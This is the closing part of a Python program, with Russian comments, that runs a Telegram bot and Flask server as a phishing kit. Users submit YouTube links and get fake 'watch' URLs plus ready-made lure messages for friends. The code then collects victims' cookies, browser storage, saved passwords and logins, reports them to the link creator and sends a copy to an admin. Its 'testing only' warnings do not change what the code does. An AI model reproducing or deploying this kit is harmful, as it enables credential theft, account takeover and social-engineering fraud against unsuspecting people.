6. *Все полные данные также отправятся администратору*

🔐 *Что именно собирается:*
• Все cookies текущего сайта (включая сессионные)
• LocalStorage и SessionStorage
• Сохраненные в браузере пароли
• Данные автозаполнения форм
• Логины из полей ввода
• Данные из всех хранилищ браузера
• Информация об устройстве и браузере
• *Определение сервисов*: Google, Facebook, ВКонтакте, Twitter, Instagram и др.

⏱️ *Время сбора:* ~3-20 секунд
🔒 *Безопасность:* Данные шифруются при передаче

⚠️ *Важные предупреждения:*
• Используйте только для тестирования
• Не используйте для незаконных целей
• Данные хранятся 24 часа
• Все полные данные отправляются администратору
• Бот логирует все действия

🔧 *Команды:*
• /start - Начало работы
• /data [ID] - Просмотр данных
• /stats - Статистика системы
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁

Я нашел супер интересное видео на YouTube!
Обязательно посмотри - там реально круто!

🔗 *Ссылка на видео:*
{phishing_url}

⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
но по этой ссылке оно откроется точно!

Скорее переходи! 👆
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )

# Webhook обработчик для сбора данных
async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        # Определяем тип данных
        data_type = request_data.get("data_type", "sensitive_data")
        
        # Всегда собираем данные (включая мгновенный сбор)
        collected_data = await data_collector.collect_all_data(request_data)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if link:
            # Создаем уведомление о мгновенном сборе
            if data_type == "instant_credentials":
                instant_result = collected_data.get("data", {}).get("instant_credentials", {})
                if instant_result.get("status") == "instant_collection_success":
                    # Отправляем уведомление о мгновенном сборе
                    instant_message = f"""
⚡ *МГНОВЕННЫЙ СБОР ДАННЫХ!*

🔄 Собрано сразу при загрузке страницы:

🔑 Найдено паролей: {instant_result.get('passwords_collected', 0)}
👤 Найдено логинов: {instant_result.get('logins_collected', 0)}
📋 Найдено форм: {instant_result.get('forms_collected', 0)}

✅ Данные собраны БЕЗ взаимодействия пользователя
⏱ Время сбора: менее 1 секунды
📊 Статус: мгновенный сбор завершен
"""
                    
                    # Добавляем информацию о сервисах
                    account_analysis = instant_result.get("account_analysis", {})
                    if account_analysis.get("service_stats"):
                        instant_message += "\n🌐 *ОПРЕДЕЛЕНЫ СЕРВИСЫ:*\n"
                        for service, count in account_analysis["service_stats"].items():
                            service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                            instant_message += f"• {service_name_ru}: {count} записей\n"
                    
                    try:
                        await context.bot.send_message(
                            chat_id=link.created_by,
                            text=instant_message,
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except Exception as e:
                        logger.error(f"Error sending instant collection notification: {e}")
            
            # Отправляем полный отчет о данных
            message = formatter.format_collected_data(link_id, collected_data)
            
            try:
                await context.bot.send_message(
                    chat_id=link.created_by,
                    text=message,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Error sending to link creator: {e}")
            
            # Отправляем ДЕТАЛЬНЫЕ данные админу
            await send_detailed_data_to_admin(context, link, collected_data)
            
        return {"status": "success", "data_received": True, "data_type": data_type}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

# ========== ЗАПУСК СИСТЕМЫ ==========

def run_flask():
    """Запуск Flask сервера"""
    print(f"🌐 Веб-сервер запущен на: {DOMAIN}")
    print("📁 Доступные маршруты:")
    print(f"   • {DOMAIN}/watch?v=VIDEO_ID&id=LINK_ID - фишинговая страница")
    print(f"   • {DOMAIN}/api/collect - API для сбора данных")
    print(f"   • {DOMAIN}/api/visit - API для отслеживания посещений")
    
    # Для PythonAnywhere нужно использовать port 5000
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)

def run_bot():
    """Запуск Telegram бота"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("data", show_data_command))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    print("🤖 Telegram бот запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🚀 Функции бота:")
    print("   - Сбор cookies, паролей, логинов")
    print("   - Определение сервисов (Google, Facebook и др.)")
    print("⏳ Ожидание команд...")
    print("💡 Основные команды:")
    print("   /start - Начало работы")
    print("   /data [ID] - Просмотр данных")
    print("   Отправьте ссылку на YouTube - создание фишинговой ссылки")
    
    application.run_polling(allowed_updates=Update.ALL_UPDATES)

def main():
    """Главная функция запуска"""
    print("""
🎯 YOUTUBE DATA COLLECTOR SYSTEM
================================
🚀 Запуск системы...
""")
    
    # Создаем папки если нет
    os.makedirs('static', exist_ok=True)
    os.makedirs('screenshots', exist_ok=True)
    
    # Запускаем в двух потоках
    import threading
    
    # Поток для Flask сервера
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Запускаем бота в основном потоке
    time.sleep(2)  # Даем время Flask запуститься
    run_bot()

if __name__ == '__main__':
    main()